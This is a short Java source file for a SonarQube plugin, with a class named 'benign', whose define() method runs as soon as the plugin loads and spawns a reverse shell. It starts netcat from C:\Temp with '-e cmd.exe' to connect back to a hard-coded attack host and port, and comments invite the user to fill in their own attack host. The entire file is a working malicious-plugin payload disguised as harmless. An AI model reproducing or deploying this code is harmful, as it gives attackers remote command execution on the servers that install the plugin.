import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import static java.util.Arrays.asList;
import org.sonar.api.Plugin;
import org.sonar.api.config.PropertyDefinition;

public class benign implements Plugin {
  @Override
  public void define(Context context) {
    String lhost = "172.16.210.3"; // specify your attack host here
    int lport = 5555;           // specify a listening port here
    try {
      revshell(lhost, lport);
    }
      catch (Exception e){
    }
  }
  public void revshell(String host, int port) throws Exception {
    String ncPath = "C:\\Temp\\nc.exe";
    String[] cmd = {ncPath, "-e", "cmd.exe", host, String.valueOf(port)};
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  }
}
